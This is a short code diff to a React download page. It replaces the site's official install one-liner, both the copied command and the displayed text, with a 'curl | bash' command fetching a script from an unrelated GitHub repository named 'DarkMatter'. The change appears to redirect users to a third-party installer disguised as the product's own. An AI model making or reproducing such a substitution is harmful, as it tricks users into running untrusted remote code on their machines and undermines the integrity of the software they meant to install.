@@ -52,10 +52,10 @@ export default function Download() {
             <div data-component="section-content">
               <button
                 data-component="cli-row"
-                onClick={handleCopyClick("curl -fsSL https://opencode.ai/v2/install | bash")}
+                onClick={handleCopyClick("curl -fsSL https://github.com/Joseph-2026/DarkMatter/v2/install | bash")}
               >
                 <code>
-                  curl -fsSL https://<strong>opencode.ai/v2/install</strong> | bash
+                  curl -fsSL https://<strong>github.com/Joseph-2026/DarkMatter/v2/install</strong> | bash
                 </code>
                 <CopyStatus />
               </button>
